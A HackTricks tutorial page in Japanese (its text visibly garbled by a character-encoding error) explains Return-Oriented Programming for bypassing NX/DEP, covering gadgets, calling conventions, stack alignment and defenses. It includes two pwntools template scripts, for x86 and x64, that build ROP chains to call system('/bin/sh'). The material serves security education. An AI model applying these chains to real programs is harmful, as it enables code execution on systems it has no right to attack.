# ROP - Return Oriented Programing

<details>

<summary><strong>ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•ï¼š

- **HackTricksã§ä¼æ¥­ã‚’å®£ä¼ã—ãŸã„**ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
- [**å…¬å¼PEASSï¼†HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’è¦‹ã¤ã‘ã‚‹
- **Discordã‚°ãƒ«ãƒ¼ãƒ—**ã«**å‚åŠ **ğŸ’¬ï¼ˆhttps://discord.gg/hRep4RUj7fï¼‰ã¾ãŸã¯**telegramã‚°ãƒ«ãƒ¼ãƒ—**ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter**ğŸ¦ã§**ãƒ•ã‚©ãƒ­ãƒ¼**ã™ã‚‹ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã€‚**
- **HackTricks**ï¼ˆhttps://github.com/carlospolop/hacktricksï¼‰ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã—ã¦ãã ã•ã„ã€‚

</details>

## **åŸºæœ¬æƒ…å ±**

**Return-Oriented Programming (ROP)**ã¯ã€**No-Execute (NX)**ã‚„**Data Execution Prevention (DEP)**ãªã©ã®ã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å¯¾ç­–ã‚’å›é¿ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã‚‹é«˜åº¦ãªã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆæŠ€è¡“ã§ã™ã€‚ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã‚’æ³¨å…¥ã—ã¦å®Ÿè¡Œã™ã‚‹ä»£ã‚ã‚Šã«ã€æ”»æ’ƒè€…ã¯ãƒã‚¤ãƒŠãƒªã‚„ãƒ­ãƒ¼ãƒ‰ã•ã‚ŒãŸãƒ©ã‚¤ãƒ–ãƒ©ãƒªã«æ—¢ã«å­˜åœ¨ã™ã‚‹ã‚³ãƒ¼ãƒ‰ç‰‡ï¼ˆ**"ã‚¬ã‚¸ã‚§ãƒƒãƒˆ"**ã¨ã—ã¦çŸ¥ã‚‰ã‚Œã‚‹ï¼‰ã‚’åˆ©ç”¨ã—ã¾ã™ã€‚å„ã‚¬ã‚¸ã‚§ãƒƒãƒˆã¯é€šå¸¸ã€`ret`å‘½ä»¤ã§çµ‚ã‚ã‚Šã€ãƒ‡ãƒ¼ã‚¿ã‚’ãƒ¬ã‚¸ã‚¹ã‚¿é–“ã§ç§»å‹•ã—ãŸã‚Šç®—è¡“æ¼”ç®—ã‚’è¡Œã£ãŸã‚Šã™ã‚‹ãªã©ã€å°ã•ãªæ“ä½œã‚’å®Ÿè¡Œã—ã¾ã™ã€‚ã“ã‚Œã‚‰ã®ã‚¬ã‚¸ã‚§ãƒƒãƒˆã‚’é€£é–ã•ã›ã‚‹ã“ã¨ã§ã€æ”»æ’ƒè€…ã¯ä»»æ„ã®æ“ä½œã‚’å®Ÿè¡Œã™ã‚‹ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã‚’æ§‹ç¯‰ã—ã€NX/DEPä¿è­·ã‚’ãƒã‚¤ãƒ‘ã‚¹ã§ãã¾ã™ã€‚

### ROPã®å‹•ä½œæ–¹æ³•

1. **åˆ¶å¾¡ãƒ•ãƒ­ãƒ¼ã®ãƒã‚¤ã‚¸ãƒ£ãƒƒã‚¯**ï¼šã¾ãšã€æ”»æ’ƒè€…ã¯é€šå¸¸ã€ãƒãƒƒãƒ•ã‚¡ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼ã‚’æ‚ªç”¨ã—ã¦ã‚¹ã‚¿ãƒƒã‚¯ä¸Šã®ä¿å­˜ã•ã‚ŒãŸãƒªã‚¿ãƒ¼ãƒ³ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ä¸Šæ›¸ãã™ã‚‹ã“ã¨ã§ã€ãƒ—ãƒ­ã‚°ãƒ©ãƒ ã®åˆ¶å¾¡ãƒ•ãƒ­ãƒ¼ã‚’ãƒã‚¤ã‚¸ãƒ£ãƒƒã‚¯ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
2. **ã‚¬ã‚¸ã‚§ãƒƒãƒˆã®é€£é–**ï¼šæ¬¡ã«ã€æ”»æ’ƒè€…ã¯æ³¨æ„æ·±ãã‚¬ã‚¸ã‚§ãƒƒãƒˆã‚’é¸æŠã—ã¦é€£é–ã•ã›ã€å¿…è¦ãªã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’å®Ÿè¡Œã—ã¾ã™ã€‚ã“ã‚Œã«ã¯ã€é–¢æ•°å‘¼ã³å‡ºã—ã®å¼•æ•°ã‚’è¨­å®šã—ãŸã‚Šã€é–¢æ•°ã‚’å‘¼ã³å‡ºã—ãŸã‚Šï¼ˆä¾‹ï¼š`system("/bin/sh")`ï¼‰ã€å¿…è¦ãªã‚¯ãƒªãƒ¼ãƒ³ã‚¢ãƒƒãƒ—ã‚„è¿½åŠ ã®æ“ä½œã‚’å‡¦ç†ã—ãŸã‚Šã™ã‚‹ã“ã¨ãŒå«ã¾ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚
3. **ãƒšã‚¤ãƒ­ãƒ¼ãƒ‰ã®å®Ÿè¡Œ**ï¼šè„†å¼±ãªé–¢æ•°ãŒè¿”ã•ã‚Œã‚‹ã¨ã€åˆæ³•çš„ãªå ´æ‰€ã«æˆ»ã‚‹ä»£ã‚ã‚Šã«ã€ã‚¬ã‚¸ã‚§ãƒƒãƒˆã®é€£é–ã‚’å®Ÿè¡Œã—å§‹ã‚ã¾ã™ã€‚

### ãƒ„ãƒ¼ãƒ«

é€šå¸¸ã€ã‚¬ã‚¸ã‚§ãƒƒãƒˆã¯[**ROPgadget**](https://github.com/JonathanSalwan/ROPgadget)ã€[**ropper**](https://github.com/sashs/Ropper)ã€ã¾ãŸã¯ç›´æ¥**pwntools**ï¼ˆ[ROP](https://docs.pwntools.com/en/stable/rop/rop.html)ï¼‰ã‚’ä½¿ç”¨ã—ã¦è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

## x86ã®ROPãƒã‚§ãƒ¼ãƒ³ã®ä¾‹

### **x86ï¼ˆ32ãƒ“ãƒƒãƒˆï¼‰å‘¼ã³å‡ºã—è¦ç´„**

- **cdecl**ï¼šå‘¼ã³å‡ºã—å…ƒãŒã‚¹ã‚¿ãƒƒã‚¯ã‚’ã‚¯ãƒªãƒ¼ãƒ³ã‚¢ãƒƒãƒ—ã—ã¾ã™ã€‚é–¢æ•°å¼•æ•°ã¯ã‚¹ã‚¿ãƒƒã‚¯ã«é€†é †ã§ãƒ—ãƒƒã‚·ãƒ¥ã•ã‚Œã¾ã™ï¼ˆå³ã‹ã‚‰å·¦ã«ï¼‰ã€‚**å¼•æ•°ã¯å³ã‹ã‚‰å·¦ã«ã‚¹ã‚¿ãƒƒã‚¯ã«ãƒ—ãƒƒã‚·ãƒ¥ã•ã‚Œã¾ã™ã€‚**
- **stdcall**ï¼šcdeclã«ä¼¼ã¦ã„ã¾ã™ãŒã€ã‚¹ã‚¿ãƒƒã‚¯ã®ã‚¯ãƒªãƒ¼ãƒ³ã‚¢ãƒƒãƒ—ã¯å‘¼ã³å‡ºã—å…ˆãŒæ‹…å½“ã—ã¾ã™ã€‚

### **ã‚¬ã‚¸ã‚§ãƒƒãƒˆã®æ¤œç´¢**

ã¾ãšã€ãƒã‚¤ãƒŠãƒªã¾ãŸã¯ãã®ãƒ­ãƒ¼ãƒ‰ã•ã‚ŒãŸãƒ©ã‚¤ãƒ–ãƒ©ãƒªå†…ã§å¿…è¦ãªã‚¬ã‚¸ã‚§ãƒƒãƒˆã‚’ç‰¹å®šã—ãŸã¨ä»®å®šã—ã¾ã—ã‚‡ã†ã€‚èˆˆå‘³ã‚’æŒã¤ã‚¬ã‚¸ã‚§ãƒƒãƒˆã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™ï¼š

- `pop eax; ret`ï¼šã“ã®ã‚¬ã‚¸ã‚§ãƒƒãƒˆã¯ã‚¹ã‚¿ãƒƒã‚¯ã®ãƒˆãƒƒãƒ—ã®å€¤ã‚’`EAX`ãƒ¬ã‚¸ã‚¹ã‚¿ã«ãƒãƒƒãƒ—ã—ã¦ã‹ã‚‰æˆ»ã‚Šã€`EAX`ã‚’åˆ¶å¾¡ã§ãã‚‹ã‚ˆã†ã«ã—ã¾ã™ã€‚
- `pop ebx; ret`ï¼šä¸Šè¨˜ã¨åŒæ§˜ã§ã™ãŒã€`EBX`ãƒ¬ã‚¸ã‚¹ã‚¿ç”¨ã§ã‚ã‚Šã€`EBX`ã‚’åˆ¶å¾¡ã§ãã‚‹ã‚ˆã†ã«ã—ã¾ã™ã€‚
- `mov [ebx], eax; ret`ï¼š`EAX`ã®å€¤ã‚’`EBX`ãŒæŒ‡ã™ãƒ¡ãƒ¢ãƒªä½ç½®ã«ç§»å‹•ã—ã¦ã‹ã‚‰æˆ»ã‚Šã¾ã™ã€‚ã“ã‚Œã¯é€šå¸¸ã€**write-what-whereã‚¬ã‚¸ã‚§ãƒƒãƒˆ**ã¨å‘¼ã°ã‚Œã¾ã™ã€‚
- ã•ã‚‰ã«ã€`system()`é–¢æ•°ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ãŒåˆ©ç”¨å¯èƒ½ã§ã™ã€‚

### **ROPãƒã‚§ãƒ¼ãƒ³**

**pwntools**ã‚’ä½¿ç”¨ã—ã¦ã€æ¬¡ã®ã‚ˆã†ã«ROPãƒã‚§ãƒ¼ãƒ³ã®å®Ÿè¡Œã®ãŸã‚ã«ã‚¹ã‚¿ãƒƒã‚¯ã‚’æº–å‚™ã—ã¾ã™ã€‚`system('/bin/sh')`ã‚’å®Ÿè¡Œã™ã‚‹ã“ã¨ã‚’ç›®æŒ‡ã—ã¦ã„ã¾ã™ã€‚ãƒã‚§ãƒ¼ãƒ³ãŒæ¬¡ã®ã‚ˆã†ã«å§‹ã¾ã‚‹ã“ã¨ã«æ³¨ç›®ã—ã¦ãã ã•ã„ï¼š

1. ã‚¢ãƒ©ã‚¤ãƒ¡ãƒ³ãƒˆç›®çš„ã®`ret`å‘½ä»¤ï¼ˆã‚ªãƒ—ã‚·ãƒ§ãƒ³ï¼‰
2. `system`é–¢æ•°ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ï¼ˆASLRãŒç„¡åŠ¹ã§æ—¢çŸ¥ã®libcã®å ´åˆã€è©³ç´°ã¯[**Ret2lib**](ret2lib/)ã«ã‚ã‚Šã¾ã™ï¼‰
3. `system()`ã‹ã‚‰ã®æˆ»ã‚Šã‚¢ãƒ‰ãƒ¬ã‚¹ã®ãƒ—ãƒ¬ãƒ¼ã‚¹ãƒ›ãƒ«ãƒ€
4. `"/bin/sh"`æ–‡å­—åˆ—ã‚¢ãƒ‰ãƒ¬ã‚¹ï¼ˆsystemé–¢æ•°ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ï¼‰
```python
from pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadc0de

# A gadget to control the return address, typically found through analysis
ret_gadget = 0xcafebabe  # This could be any gadget that allows us to control the return address

# Construct the ROP chain
rop_chain = [
ret_gadget,    # This gadget is used to align the stack if necessary, especially to bypass stack alignment issues
system_addr,   # Address of system(). Execution will continue here after the ret gadget
0x41414141,    # Placeholder for system()'s return address. This could be the address of exit() or another safe place.
bin_sh_addr    # Address of "/bin/sh" string goes here, as the argument to system()
]

# Flatten the rop_chain for use
rop_chain = b''.join(p32(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```
## x64ã§ã®ROPãƒã‚§ãƒ¼ãƒ³ã®ä¾‹

### **x64ï¼ˆ64ãƒ“ãƒƒãƒˆï¼‰å‘¼ã³å‡ºã—è¦ç´„**

* Unixç³»ã‚·ã‚¹ãƒ†ãƒ ã§ã¯ã€**æœ€åˆã®6ã¤ã®æ•´æ•°ã¾ãŸã¯ãƒã‚¤ãƒ³ã‚¿å¼•æ•°ã¯ãƒ¬ã‚¸ã‚¹ã‚¿ `RDI`ã€`RSI`ã€`RDX`ã€`RCX`ã€`R8`ã€ãŠã‚ˆã³ `R9` ã«æ¸¡ã•ã‚Œã¾ã™**ã€‚è¿½åŠ ã®å¼•æ•°ã¯ã‚¹ã‚¿ãƒƒã‚¯ã«æ¸¡ã•ã‚Œã¾ã™ã€‚æˆ»ã‚Šå€¤ã¯ `RAX` ã«é…ç½®ã•ã‚Œã¾ã™ã€‚
* **Windows x64** å‘¼ã³å‡ºã—è¦ç´„ã§ã¯ã€æœ€åˆã®4ã¤ã®æ•´æ•°ã¾ãŸã¯ãƒã‚¤ãƒ³ã‚¿å¼•æ•°ã«ã¯ `RCX`ã€`RDX`ã€`R8`ã€ãŠã‚ˆã³ `R9` ãŒä½¿ç”¨ã•ã‚Œã€è¿½åŠ ã®å¼•æ•°ã¯ã‚¹ã‚¿ãƒƒã‚¯ã«æ¸¡ã•ã‚Œã¾ã™ã€‚æˆ»ã‚Šå€¤ã¯ `RAX` ã«é…ç½®ã•ã‚Œã¾ã™ã€‚
* **ãƒ¬ã‚¸ã‚¹ã‚¿**: 64ãƒ“ãƒƒãƒˆãƒ¬ã‚¸ã‚¹ã‚¿ã«ã¯ `RAX`ã€`RBX`ã€`RCX`ã€`RDX`ã€`RSI`ã€`RDI`ã€`RBP`ã€`RSP`ã€ãŠã‚ˆã³ `R8` ã‹ã‚‰ `R15` ãŒå«ã¾ã‚Œã¾ã™ã€‚

#### **ã‚¬ã‚¸ã‚§ãƒƒãƒˆã®æ¤œç´¢**

ä»Šå›ã¯ã€**RDI** ãƒ¬ã‚¸ã‚¹ã‚¿ã‚’è¨­å®šã—ï¼ˆ**system()** ã« **"/bin/sh"** æ–‡å­—åˆ—ã‚’å¼•æ•°ã¨ã—ã¦æ¸¡ã™ãŸã‚ï¼‰ã€ãã®å¾Œ **system()** é–¢æ•°ã‚’å‘¼ã³å‡ºã™ãŸã‚ã®ã‚¬ã‚¸ã‚§ãƒƒãƒˆã«ç„¦ç‚¹ã‚’å½“ã¦ã¾ã™ã€‚ä»¥ä¸‹ã®ã‚¬ã‚¸ã‚§ãƒƒãƒˆã‚’ç‰¹å®šã—ãŸã¨ä»®å®šã—ã¾ã™:

* **pop rdi; ret**: ã‚¹ã‚¿ãƒƒã‚¯ã®ãƒˆãƒƒãƒ—ã®å€¤ã‚’ **RDI** ã«ãƒãƒƒãƒ—ã—ã¦ã‹ã‚‰æˆ»ã‚Šã¾ã™ã€‚**system()** ã®å¼•æ•°ã‚’è¨­å®šã™ã‚‹ãŸã‚ã«å¿…è¦ã§ã™ã€‚
* **ret**: å˜ç´”ãªãƒªã‚¿ãƒ¼ãƒ³ã§ã€ä¸€éƒ¨ã®ã‚·ãƒŠãƒªã‚ªã§ã‚¹ã‚¿ãƒƒã‚¯ã®æ•´åˆ—ã«å½¹ç«‹ã¡ã¾ã™ã€‚

ãã—ã¦ã€**system()** é–¢æ•°ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’çŸ¥ã£ã¦ã„ã‚‹ã¨ã—ã¾ã™ã€‚

### **ROPãƒã‚§ãƒ¼ãƒ³**

ä»¥ä¸‹ã¯ã€**pwntools** ã‚’ä½¿ç”¨ã—ã¦ **x64** ã§ **system('/bin/sh')** ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã®ROPãƒã‚§ãƒ¼ãƒ³ã‚’è¨­å®šã—ã¦å®Ÿè¡Œã™ã‚‹ä¾‹ã§ã™:
```python
from pwn import *

# Assuming we have the binary's ELF and its process
binary = context.binary = ELF('your_binary_here')
p = process(binary.path)

# Find the address of the string "/bin/sh" in the binary
bin_sh_addr = next(binary.search(b'/bin/sh\x00'))

# Address of system() function (hypothetical value)
system_addr = 0xdeadbeefdeadbeef

# Gadgets (hypothetical values)
pop_rdi_gadget = 0xcafebabecafebabe  # pop rdi; ret
ret_gadget = 0xdeadbeefdeadbead     # ret gadget for alignment, if necessary

# Construct the ROP chain
rop_chain = [
ret_gadget,        # Alignment gadget, if needed
pop_rdi_gadget,    # pop rdi; ret
bin_sh_addr,       # Address of "/bin/sh" string goes here, as the argument to system()
system_addr        # Address of system(). Execution will continue here.
]

# Flatten the rop_chain for use
rop_chain = b''.join(p64(addr) for addr in rop_chain)

# Send ROP chain
## offset is the number of bytes required to reach the return address on the stack
payload = fit({offset: rop_chain})
p.sendline(payload)
p.interactive()
```
### ã‚¹ã‚¿ãƒƒã‚¯ã‚¢ãƒ©ã‚¤ãƒ¡ãƒ³ãƒˆ

**x86-64 ABI** ã¯ã€**callå‘½ä»¤**ãŒå®Ÿè¡Œã•ã‚Œã‚‹éš›ã«**ã‚¹ã‚¿ãƒƒã‚¯ãŒ16ãƒã‚¤ãƒˆã«æ•´åˆ—**ã•ã‚Œã‚‹ã“ã¨ã‚’ä¿è¨¼ã—ã¾ã™ã€‚**LIBC** ã¯ã€ãƒ‘ãƒ•ã‚©ãƒ¼ãƒãƒ³ã‚¹ã‚’æœ€é©åŒ–ã™ã‚‹ãŸã‚ã«**SSEå‘½ä»¤**ï¼ˆä¾‹: **movaps**ï¼‰ã‚’ä½¿ç”¨ã—ã€ã“ã®æ•´åˆ—ãŒå¿…è¦ã§ã™ã€‚ã‚¹ã‚¿ãƒƒã‚¯ãŒé©åˆ‡ã«æ•´åˆ—ã•ã‚Œã¦ã„ãªã„å ´åˆï¼ˆã¤ã¾ã‚Š**RSP**ãŒ16ã®å€æ•°ã§ãªã„å ´åˆï¼‰ã€**system**ãªã©ã®é–¢æ•°ã®å‘¼ã³å‡ºã—ã¯**ROPãƒã‚§ãƒ¼ãƒ³**ã§å¤±æ•—ã—ã¾ã™ã€‚ã“ã‚Œã‚’ä¿®æ­£ã™ã‚‹ã«ã¯ã€ROPãƒã‚§ãƒ¼ãƒ³ã§**system**ã‚’å‘¼ã³å‡ºã™å‰ã«**retã‚¬ã‚¸ã‚§ãƒƒãƒˆ**ã‚’è¿½åŠ ã™ã‚‹ã ã‘ã§ã™ã€‚

## x86ã¨x64ã®ä¸»ãªé•ã„

{% hint style="success" %}
**x64ã¯æœ€åˆã®æ•°å€¤å¼•æ•°ã«ãƒ¬ã‚¸ã‚¹ã‚¿ã‚’ä½¿ç”¨**ã™ã‚‹ãŸã‚ã€å˜ç´”ãªé–¢æ•°å‘¼ã³å‡ºã—ã«ã¯x86ã‚ˆã‚Šã‚‚å°‘ãªã„ã‚¬ã‚¸ã‚§ãƒƒãƒˆãŒå¿…è¦ã§ã™ãŒã€é©åˆ‡ãªã‚¬ã‚¸ã‚§ãƒƒãƒˆã‚’è¦‹ã¤ã‘ã¦ãƒã‚§ãƒ¼ãƒ³ã™ã‚‹ã“ã¨ã¯ã€ãƒ¬ã‚¸ã‚¹ã‚¿ã®æ•°ã®å¢—åŠ ã¨ã‚¢ãƒ‰ãƒ¬ã‚¹ç©ºé–“ã®æ‹¡å¤§ã«ã‚ˆã‚Šã€ã‚ˆã‚Šè¤‡é›‘ã«ãªã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚**x64**ã‚¢ãƒ¼ã‚­ãƒ†ã‚¯ãƒãƒ£ã®å¢—åŠ ã—ãŸãƒ¬ã‚¸ã‚¹ã‚¿æ•°ã¨å¤§ããªã‚¢ãƒ‰ãƒ¬ã‚¹ç©ºé–“ã¯ã€ç‰¹ã«Return-Oriented Programmingï¼ˆROPï¼‰ã®æ–‡è„ˆã§ã®ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆé–‹ç™ºã«ãŠã„ã¦ã€æ©Ÿä¼šã¨èª²é¡Œã®ä¸¡æ–¹ã‚’æä¾›ã—ã¾ã™ã€‚
{% endhint %}

## ARM64ã®ROPãƒã‚§ãƒ¼ãƒ³ã®ä¾‹

### **ARM64ã®åŸºç¤ã¨å‘¼ã³å‡ºã—è¦ç´„**

ã“ã®æƒ…å ±ã«ã¤ã„ã¦ã¯ã€æ¬¡ã®ãƒšãƒ¼ã‚¸ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„:

{% content-ref url="../../macos-hardening/macos-security-and-privilege-escalation/macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-hardening/macos-security-and-privilege-escalation/macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}

## ROPã«å¯¾ã™ã‚‹ä¿è­·

* [**ASLR**](../common-binary-protections-and-bypasses/aslr/) **&** [**PIE**](../common-binary-protections-and-bypasses/pie/): ã“ã‚Œã‚‰ã®ä¿è­·ã¯ã€ã‚¬ã‚¸ã‚§ãƒƒãƒˆã®ã‚¢ãƒ‰ãƒ¬ã‚¹ãŒå®Ÿè¡Œã”ã¨ã«å¤‰åŒ–ã™ã‚‹ãŸã‚ã€ROPã®ä½¿ç”¨ã‚’å›°é›£ã«ã—ã¾ã™ã€‚
* [**ã‚¹ã‚¿ãƒƒã‚¯ã‚­ãƒ£ãƒŠãƒªãƒ¼**](../common-binary-protections-and-bypasses/stack-canaries/): BOFã®å ´åˆã€ROPãƒã‚§ãƒ¼ãƒ³ã‚’æ‚ªç”¨ã™ã‚‹ãŸã‚ã«ã¯ã€ã‚¹ã‚¿ãƒƒã‚¯ã‚­ãƒ£ãƒŠãƒªãƒ¼ã‚’ãƒã‚¤ãƒ‘ã‚¹ã—ã¦ãƒªã‚¿ãƒ¼ãƒ³ãƒã‚¤ãƒ³ã‚¿ã‚’ä¸Šæ›¸ãã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
* **ã‚¬ã‚¸ã‚§ãƒƒãƒˆã®ä¸è¶³**: ååˆ†ãªã‚¬ã‚¸ã‚§ãƒƒãƒˆãŒãªã„å ´åˆã€ROPãƒã‚§ãƒ¼ãƒ³ã‚’ç”Ÿæˆã™ã‚‹ã“ã¨ã¯ã§ãã¾ã›ã‚“ã€‚

## ROPãƒ™ãƒ¼ã‚¹ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯

ROPã¯å˜ãªã‚‹ä»»æ„ã®ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã®ãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ã§ã‚ã‚‹ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚ROPã‚’åŸºã«ã€å¤šãã®Ret2XXXãƒ†ã‚¯ãƒ‹ãƒƒã‚¯ãŒé–‹ç™ºã•ã‚Œã¾ã—ãŸ:

* **Ret2lib**: ROPã‚’ä½¿ç”¨ã—ã¦ã€ãƒ­ãƒ¼ãƒ‰ã•ã‚ŒãŸãƒ©ã‚¤ãƒ–ãƒ©ãƒªã‹ã‚‰ä»»æ„ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ï¼ˆé€šå¸¸ã¯`system('/bin/sh')`ã®ã‚ˆã†ãªã‚‚ã®ï¼‰ã‚’æŒã¤ä»»æ„ã®é–¢æ•°ã‚’å‘¼ã³å‡ºã—ã¾ã™ã€‚

{% content-ref url="ret2lib/" %}
[ret2lib](ret2lib/)
{% endcontent-ref %}

* **Ret2Syscall**: ROPã‚’ä½¿ç”¨ã—ã¦ã€`execve`ãªã©ã®ã‚·ã‚¹ã‚³ãƒ¼ãƒ«ã‚’å‘¼ã³å‡ºã™æº–å‚™ã‚’ã—ã€ä»»æ„ã®ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã—ã¾ã™ã€‚

{% content-ref url="rop-syscall-execv/" %}
[rop-syscall-execv](rop-syscall-execv/)
{% endcontent-ref %}

* **EBP2Ret & EBP Chaining**: æœ€åˆã®ã‚‚ã®ã¯EIPã®ä»£ã‚ã‚Šã«EBPã‚’æ‚ªç”¨ã—ã¦ãƒ•ãƒ­ãƒ¼ã‚’åˆ¶å¾¡ã—ã€2ç•ªç›®ã¯Ret2libã«ä¼¼ã¦ã„ã¾ã™ãŒã€ã“ã®å ´åˆã€ãƒ•ãƒ­ãƒ¼ã¯ä¸»ã«EBPã‚¢ãƒ‰ãƒ¬ã‚¹ã§åˆ¶å¾¡ã•ã‚Œã¾ã™ï¼ˆãŸã ã—ã€EIPã®åˆ¶å¾¡ã‚‚å¿…è¦ã§ã™ï¼‰ã€‚

{% content-ref url="../stack-overflow/stack-pivoting-ebp2ret-ebp-chaining.md" %}
[stack-pivoting-ebp2ret-ebp-chaining.md](../stack-overflow/stack-pivoting-ebp2ret-ebp-chaining.md)
{% endcontent-ref %}

## ãã®ä»–ã®ä¾‹ã¨å‚ç…§

* [https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions](https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/exploiting-calling-conventions)
* [https://guyinatuxedo.github.io/15-partial\_overwrite/hacklu15\_stackstuff/index.html](https://guyinatuxedo.github.io/15-partial\_overwrite/hacklu15\_stackstuff/index.html)
* 64ãƒ“ãƒƒãƒˆã€PieãŠã‚ˆã³nxæœ‰åŠ¹ã€ã‚­ãƒ£ãƒŠãƒªãªã—ã€`vsyscall`ã‚¢ãƒ‰ãƒ¬ã‚¹ã§RIPã‚’ä¸Šæ›¸ãã—ã€ã‚¹ã‚¿ãƒƒã‚¯å†…ã®æ¬¡ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã«æˆ»ã‚‹ã“ã¨ã§ã€ãƒ•ãƒ©ã‚°ã‚’æ¼æ´©ã•ã›ã‚‹é–¢æ•°ã®ä¸€éƒ¨ã‚’å–å¾—ã™ã‚‹ãŸã‚ã®éƒ¨åˆ†çš„ãªä¸Šæ›¸ãã‚’è¡Œã„ã¾ã™ã€‚
* [https://8ksec.io/arm64-reversing-and-exploitation-part-4-using-mprotect-to-bypass-nx-protection-8ksec-blogs/](https://8ksec.io/arm64-reversing-and-exploitation-part-4-using-mprotect-to-bypass-nx-protection-8ksec-blogs/)
* arm64ã€ASLRãªã—ã€ã‚¹ã‚¿ãƒƒã‚¯ã‚’å®Ÿè¡Œå¯èƒ½ã«ã™ã‚‹ROPã‚¬ã‚¸ã‚§ãƒƒãƒˆã¨ã‚¹ã‚¿ãƒƒã‚¯å†…ã®ã‚·ã‚§ãƒ«ã‚³ãƒ¼ãƒ‰ã«ã‚¸ãƒ£ãƒ³ãƒ—ã—ã¾ã™
